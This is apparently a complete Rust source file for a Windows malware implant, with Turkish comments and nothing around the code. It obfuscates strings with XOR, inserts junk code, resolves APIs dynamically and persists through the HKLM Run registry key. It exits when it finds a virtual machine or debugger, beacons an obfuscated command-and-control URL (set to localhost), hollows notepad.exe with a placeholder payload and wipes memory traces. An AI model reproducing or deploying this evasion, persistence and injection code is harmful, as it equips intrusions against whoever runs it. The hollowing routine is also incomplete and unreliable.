#![windows_subsystem = "windows"]

use std::{ptr, mem, ffi::CString};
use winapi::{
    um::{
        winnt::{HANDLE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
        processthreadsapi::{GetCurrentProcess, CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION, ResumeThread},
        memoryapi::{VirtualProtect, VirtualAllocEx, WriteProcessMemory},
        handleapi::CloseHandle,
        debugapi::IsDebuggerPresent,
        winbase::{CREATE_SUSPENDED},
        libloaderapi::{GetModuleHandleA, GetProcAddress},
    },
    shared::minwindef::{LPVOID, DWORD},
};
use lazy_static::lazy_static;
use sysinfo::{System, SystemExt, Process, ProcessExt};
use rand::{Rng, distributions::Alphanumeric};
use std::time::{Instant, Duration};
use winreg::enums::*;
use base64::{Engine as _, engine::general_purpose};
use reqwest::blocking::Client;
use std::env;

// Function pointer types
type FnGetCurrentProcess = unsafe extern "system" fn() -> HANDLE;
type FnVirtualProtect = unsafe extern "system" fn(LPVOID, usize, DWORD, *mut DWORD) -> i32;

// Dynamic function pointers
struct DynamicApis {
    get_current_process: Option<FnGetCurrentProcess>,
    virtual_protect: Option<FnVirtualProtect>,
}

lazy_static! {
    static ref APIS: DynamicApis = unsafe { load_dynamic_apis() };
}

// String obfuscation için XOR key
const XOR_KEY: u8 = 0x42;

// Junk code generation
fn execute_junk_code() {
    let mut rng = rand::thread_rng();
    let iterations = rng.gen_range(1000..5000);
    
    for _ in 0..iterations {
        let op = rng.gen_range(0..4);
        match op {
            0 => { let _ = rng.gen::<u64>().wrapping_mul(rng.gen()); }
            1 => { let _ = rng.gen::<u32>().rotate_left(rng.gen_range(1..32)); }
            2 => { let _ = rng.gen::<i64>().abs(); }
            _ => { let _ = rng.gen::<f64>().sin(); }
        }
    }
}

// Dinamik API yükleme
unsafe fn load_dynamic_apis() -> DynamicApis {
    let kernel32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr() as *const i8);
    
    DynamicApis {
        get_current_process: if !kernel32.is_null() {
            Some(std::mem::transmute(GetProcAddress(
                kernel32,
                b"GetCurrentProcess\0".as_ptr() as *const i8
            )))
        } else {
            None
        },
        virtual_protect: if !kernel32.is_null() {
            Some(std::mem::transmute(GetProcAddress(
                kernel32,
                b"VirtualProtect\0".as_ptr() as *const i8
            )))
        } else {
            None
        },
    }
}

// Obfuscated strings
fn obfuscate(s: &str) -> Vec<u8> {
    s.bytes().map(|b| b ^ XOR_KEY).collect()
}

fn deobfuscate(data: &[u8]) -> String {
    String::from_utf8(
        data.iter()
            .map(|&b| b ^ XOR_KEY)
            .collect()
    ).unwrap()
}

// Dinamik string oluşturma
fn generate_random_string(len: usize) -> String {
    execute_junk_code(); // Add some noise
    rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(len)
        .map(char::from)
        .collect()
}

lazy_static! {
    static ref C2_SERVER: Vec<u8> = obfuscate("http://localhost:8080");
    static ref HIDDEN_MESSAGE: Vec<u8> = obfuscate("Driver başlatıldı");
    static ref REGISTRY_KEY: Vec<u8> = obfuscate("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    static ref SERVICE_NAME: String = generate_random_string(12);
}

// Registry persistence with obfuscation
fn add_to_registry() -> bool {
    execute_junk_code();
    let path = env::current_exe().unwrap();
    let hklm = winreg::RegKey::predef(HKEY_LOCAL_MACHINE);
    match hklm.create_subkey(&deobfuscate(&REGISTRY_KEY)) {
        Ok((key, _)) => {
            execute_junk_code();
            key.set_value(&*SERVICE_NAME, &path.to_str().unwrap()).is_ok()
        }
        Err(_) => false
    }
}

// Şifreli network iletişimi
fn send_encrypted_data(data: &[u8]) -> Result<String, Box<dyn std::error::Error>> {
    execute_junk_code();
    
    // Veriyi karıştır
    let mut scrambled = data.to_vec();
    for i in 0..scrambled.len() {
        scrambled[i] ^= ((i * XOR_KEY as usize) % 256) as u8;
    }
    
    let encoded = general_purpose::STANDARD.encode(&scrambled);
    
    let client = Client::builder()
        .user_agent(generate_random_string(16))
        .build()?;
    
    execute_junk_code();
    
    let response = client.post(deobfuscate(&C2_SERVER))
        .header("X-Custom", generate_random_string(32))
        .body(encoded)
        .send()?
        .text()?;
    
    Ok(response)
}

// Anti-VM kontrolleri
fn detect_vm() -> bool {
    execute_junk_code();
    let sys = System::new_all();
    
    if sys.cpus().len() < 2 || 
       sys.disks().len() < 2 || 
       sys.total_memory() < 4_000_000 {
        return true;
    }

    execute_junk_code();
    false
}

// Process Hollowing with obfuscation
unsafe fn process_hollow(target_path: &str, payload: &[u8]) -> bool {
    execute_junk_code();
    
    let mut si: STARTUPINFOA = mem::zeroed();
    let mut pi: PROCESS_INFORMATION = mem::zeroed();
    si.cb = mem::size_of::<STARTUPINFOA>() as DWORD;

    let target_path = CString::new(target_path).unwrap();
    if CreateProcessA(
        ptr::null(),
        target_path.as_ptr() as *mut _,
        ptr::null_mut(),
        ptr::null_mut(),
        0,
        CREATE_SUSPENDED,
        ptr::null_mut(),
        ptr::null_mut(),
        &mut si,
        &mut pi
    ) == 0 {
        return false;
    }

    execute_junk_code();

    let remote_buffer = VirtualAllocEx(
        pi.hProcess,
        ptr::null_mut(),
        payload.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if remote_buffer.is_null() {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    execute_junk_code();

    let mut bytes_written = 0;
    if WriteProcessMemory(
        pi.hProcess,
        remote_buffer,
        payload.as_ptr() as LPVOID,
        payload.len(),
        &mut bytes_written
    ) == 0 {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    execute_junk_code();
    true
}

// Anti-debug kontrolleri
fn check_debugger() -> bool {
    execute_junk_code();
    unsafe {
        IsDebuggerPresent() != 0
    }
}

// Bellek izlerini temizleme
fn clean_memory_traces(addr: *mut u8, size: usize) {
    execute_junk_code();
    unsafe {
        if let Some(virtual_protect) = APIS.virtual_protect {
            let mut old_protect: DWORD = 0;
            virtual_protect(
                addr as LPVOID,
                size,
                PAGE_EXECUTE_READWRITE,
                &mut old_protect,
            );
            ptr::write_bytes(addr, 0, size);
            virtual_protect(
                addr as LPVOID,
                size,
                old_protect,
                &mut old_protect,
            );
        }
    }
}

fn main() {
    execute_junk_code();

    if !add_to_registry() {
        return;
    }

    execute_junk_code();

    if detect_vm() {
        return;
    }

    if check_debugger() {
        return;
    }

    if let Ok(_) = send_encrypted_data(b"driver_started") {
        println!("{}", deobfuscate(&HIDDEN_MESSAGE));
    }

    execute_junk_code();

    let target = "C:\\Windows\\System32\\notepad.exe";
    let payload = b"\x90\x90\x90";
    
    unsafe {
        if !process_hollow(target, payload) {
            return;
        }

        if let Some(get_current_process) = APIS.get_current_process {
            let handle = get_current_process();
            clean_memory_traces(handle as *mut u8, mem::size_of::<HANDLE>());
        }
    }
} 